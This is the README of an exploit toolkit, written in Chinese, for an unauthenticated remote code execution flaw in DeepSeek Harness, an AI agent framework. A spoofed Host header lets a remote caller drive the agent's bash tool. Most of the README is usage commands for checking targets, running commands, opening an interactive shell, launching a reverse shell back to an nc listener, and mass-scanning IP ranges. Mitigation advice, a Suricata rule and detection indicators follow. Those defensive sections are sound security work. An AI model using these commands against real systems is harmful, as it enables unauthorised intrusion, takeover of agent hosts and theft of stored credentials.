# QVD-2026-57410 PoC Toolkit

> DeepSeek Harness HTTP Host Header Bypass → Unauthenticated Remote Code Execution

本仓库包含 **QVD-2026-57410**(DeepSeek Harness 未授权远程代码执行漏洞)的完整 PoC 工具包。该漏洞允许攻击者通过伪造 HTTP Host 头绕过"仅限回环"的访问限制,获得与 DSH 进程同等的系统权限。

## 漏洞概述

| 项目 | 内容 |
|---|---|
| 漏洞编号 | QVD-2026-57410 |
| 严重程度 | CVSS 9.8(Critical) |
| 影响版本 | DeepSeek Harness 0.1.1-rc.2(含早期 rc 版本) |
| 漏洞类型 | HTTP Host 头信任缺陷 → 未授权 RCE |
| 攻击复杂度 | Low(无需认证,伪造 HTTP 头即可) |

**根因**:DSH `/api` 接口通过检查 HTTP `Host` 头判断请求是否来自本地,但该头由客户端完全控制。当服务暴露到非回环网络时(Docker 端口映射、Nginx 反代等),攻击者伪造 `Host: 127.0.0.1` 即可绕过检查,直接调用高权限 RPC 方法,驱动 Agent 执行任意系统命令。

## 受影响部署场景

- Docker 端口映射:`docker run -p 0.0.0.0:3000:3000`
- Nginx/Apache 反向代理未重写 Host 头
- 云环境负载均衡器转发 `/api` 路径

## 工具包内容

### 1. `dsh_exploit.py` - 主利用工具

完整功能:
- 漏洞验证(`--check`)
- 系统信息收集(`--sysinfo`)
- 单命令执行(`-c "whoami"`)
- 交互式 Shell(`--shell`)
- 反弹 Shell(`--reverse-shell`)
- 文件读写(`--read`、`--write`)

### 2. `dsh_scanner.py` - 批量扫描器

特性:
- 多线程并发扫描
- 支持 IP 范围/CIDR(`--range 192.168.1.0/24`)
- 从文件加载目标列表(`-f targets.txt`)
- JSON 结果导出(`-o results.json`)

### 3. `dsh_shell.py` - 增强交互式 Shell

高级功能:
- 命令历史(readline 支持)
- 文件上传/下载(base64 传输)
- 内置系统信息命令(`sysinfo`)
- 工作目录跟踪(`cd`)

## 快速开始

### 依赖安装

```bash
pip install -r requirements.txt
# 或使用自动安装脚本
bash setup.sh
```

### 基础用法

**1. 检查目标是否存在漏洞**
```bash
python dsh_exploit.py -t http://target:3000 --check
```

**2. 获取系统信息**
```bash
python dsh_exploit.py -t http://target:3000 --sysinfo
```

**3. 执行单条命令**
```bash
python dsh_exploit.py -t http://target:3000 -c "whoami"
```

**4. 交互式 Shell(推荐)**
```bash
python dsh_shell.py -t http://target:3000
```

**5. 反弹 Shell**
```bash
# 攻击者机器上先启动监听
nc -lvnp 4444

# 然后触发反弹
python dsh_exploit.py -t http://target:3000 --reverse-shell 10.10.10.10:4444
```

**6. 批量扫描**
```bash
# 扫描文件中的目标列表
python dsh_scanner.py -f targets.txt -o results.json

# 扫描整个 IP 段
python dsh_scanner.py --range 192.168.1.0/24 --port 3000 --threads 20
```

### 命令行参数

完整参数说明请运行:
```bash
python dsh_exploit.py --help
python dsh_scanner.py --help
python dsh_shell.py --help
```

## 修复建议

### 临时缓解措施

1. **严格绑定回环地址**
   ```bash
   npx @deepseek-ai/dsh web --host 127.0.0.1 --port 3000
   
   # Docker:仅映射到 localhost
   docker run -p 127.0.0.1:3000:3000 deepseek-harness
   ```

2. **反向代理加固**
   ```nginx
   location /api {
       # IP 白名单
       allow 10.0.0.0/8;
       deny all;
       
       # 强制重写 Host 头
       proxy_set_header Host "127.0.0.1:3000";
       proxy_pass http://127.0.0.1:3000;
   }
   ```

3. **增加认证层(HTTP Basic Auth / mTLS)**

### 长期修复

- 不信任客户端可控的 HTTP 头
- 检查 TCP 连接的 `remoteAddress` 判断真实来源
- 使用 Unix Socket 替代 TCP 监听
- 实施 API Token 认证机制

## 检测方法

### 网络层(Suricata 规则)

```
alert http any any -> any any (
  msg:"DSH Host Header Spoofing Attempt";
  content:"POST"; http_method;
  content:"/api"; http_uri;
  content:"Host: 127.0.0.1"; http_header;
  flow:to_server,established;
  classtype:web-application-attack;
  sid:10001; rev:1;
)
```

### 日志特征

- 来自非 `127.0.0.1` 源 IP 的 `/api` 请求
- Host 头为 `127.0.0.1`/`localhost` 但真实 IP 不匹配
- RPC 方法:`session.create`、`commands/execute`、`session.prompt`

### 系统层监控

- DSH 进程产生异常子进程:`bash -c`、`nc`、`curl`
- 非预期的出站连接
- 敏感文件访问:`/etc/passwd`、`/proc/self/environ`

## 技术细节

### 攻击链概览

```
1. 攻击者伪造 Host: 127.0.0.1
   ↓
2. DSH isLocalRequest() 检查通过
   ↓
3. 访问高权限 RPC:session.create
   ↓
4. 提升权限:commands/execute(danger-full-access)
   ↓
5. 执行命令:session.prompt(bash -c "...")
   ↓
6. 获得与 DSH 进程同级的系统权限
```

### 关键 RPC 方法

| 方法 | 作用 |
|---|---|
| `session.create` | 创建任意工作目录的会话 |
| `commands/execute` | 执行权限提升命令 |
| `session.prompt` | 驱动 Agent Bash 工具执行命令 |
| `settings.*` | 修改框架设置 |
| `credentials.*` | 访问存储凭证 |

详细技术分析请参考原始研究资料(见"参考链接"章节)。

## 法律声明

⚠️ **本工具包仅供以下用途:**
- 授权渗透测试
- 安全研究
- 漏洞验证与防御性测试
- 受控环境下的教育目的

**未经授权访问计算机系统是违法行为。** 使用者需确保已获得明确授权。作者对滥用本工具导致的任何法律责任概不负责。

## 参考链接

- DeepSeek Harness 官方仓库:[github.com/deepseek-ai/deepseek-harness](https://github.com/deepseek-ai/deepseek-harness)
- 漏洞详情(GitHub Discussion #853):[github.com/deepseek-ai/deepseek-harness/discussions/853](https://github.com/deepseek-ai/deepseek-harness/discussions/853)
- 奇安信威胁情报中心预警:[cn-sec.com/archives/5403588.html](https://cn-sec.com/archives/5403588.html)

## License

MIT License

Copyright (c) 2026 HackSpeak

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED. USE AT YOUR OWN RISK.
